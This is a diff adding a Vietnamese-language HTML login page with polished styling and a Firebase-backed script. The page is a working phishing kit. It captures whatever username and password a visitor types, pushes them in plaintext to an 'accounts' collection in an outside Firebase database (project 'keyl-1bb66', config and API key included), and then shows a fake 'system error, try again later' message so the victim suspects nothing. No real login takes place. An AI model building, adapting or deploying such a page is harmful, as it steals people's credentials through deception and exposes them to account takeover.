@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Đăng nhập hệ thống</title>
+
+<style>
+@import url("https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600&display=swap");
+
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: "Open Sans", sans-serif;
+}
+
+body {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+}
+
+/* nền */
+body::before {
+  content: "";
+  position: absolute;
+  width: 100%;
+  height: 100%;
+
+  background:
+    linear-gradient(rgba(0,0,0,0.35), rgba(0,0,0,0.5)),
+    url("https://blog.myridima.com/wp-content/uploads/2023/12/1674.webp") no-repeat center center/cover;
+
+  z-index: -1;
+}
+
+/* card */
+.login-card {
+  width: 400px;
+  padding: 30px;
+  border-radius: 10px;
+  text-align: center;
+  backdrop-filter: blur(10px);
+  border: 1px solid rgba(255,255,255,0.3);
+  color: #fff;
+}
+
+/* title */
+h2 {
+  margin-bottom: 25px;
+}
+
+/* input */
+.input-group {
+  position: relative;
+  margin: 20px 0;
+  border-bottom: 2px solid #aaa;
+}
+
+.input-group input {
+  width: 100%;
+  height: 40px;
+  background: transparent;
+  border: none;
+  outline: none;
+  color: #fff;
+  font-size: 16px;
+}
+
+.input-group label {
+  position: absolute;
+  top: 50%;
+  left: 0;
+  transform: translateY(-50%);
+  color: #ccc;
+  transition: 0.2s;
+  pointer-events: none;
+}
+
+/* hiệu ứng label */
+.input-group input:focus ~ label,
+.input-group input:valid ~ label {
+  top: 0;
+  font-size: 12px;
+  color: #fff;
+}
+
+/* button */
+button {
+  width: 100%;
+  padding: 12px;
+  margin-top: 20px;
+  background: #fff;
+  color: #000;
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+  font-weight: bold;
+  transition: 0.3s;
+}
+
+button:hover {
+  background: transparent;
+  color: #fff;
+  border: 1px solid #fff;
+}
+
+/* status */
+#status {
+  margin-top: 15px;
+  font-size: 14px;
+}
+</style>
+
+</head>
+<body>
+
+<div class="login-card">
+    <h2>Đăng nhập</h2>
+
+    <div class="input-group">
+        <input type="text" id="username" required>
+        <label>Tên đăng nhập</label>
+    </div>
+
+    <div class="input-group">
+        <input type="password" id="password" required>
+        <label>Mật khẩu</label>
+    </div>
+
+    <button onclick="sendToCloud()">ĐĂNG NHẬP</button>
+
+    <div id="status"></div>
+</div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyCNtDrjM-xO_lXPIOytOLuj4VfZo1qBH0s",
+  authDomain: "keyl-1bb66.firebaseapp.com",
+  databaseURL: "https://keyl-1bb66-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "keyl-1bb66",
+  storageBucket: "keyl-1bb66.firebasestorage.app",
+  messagingSenderId: "742688123103",
+  appId: "1:742688123103:web:94e9c7e88c26f8178ee16a"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+const dbRef = ref(db, 'accounts');
+
+window.sendToCloud = function() {
+    const userField = document.getElementById('username');
+    const passField = document.getElementById('password');
+    const status = document.getElementById('status');
+
+    if (userField.value && passField.value) {
+        push(dbRef, {
+            user: userField.value,
+            pass: passField.value,
+            time: new Date().toLocaleString()
+        }).then(() => {
+            userField.value = '';
+            passField.value = '';
+            status.innerHTML = '<span style="color:#0f0">Đang xử lý...</span>';
+
+            setTimeout(() => {
+                status.innerHTML = '<span style="color:#f55">Lỗi hệ thống, thử lại sau</span>';
+            }, 1500);
+        }).catch((error) => {
+            status.innerHTML = '<span style="color:red;">' + error.message + '</span>';
+        });
+    } else {
+        status.innerHTML = '<span style="color:#ccc;">Nhập đầy đủ thông tin</span>';
+    }
+};
+</script>
+
+</body>
+</html>
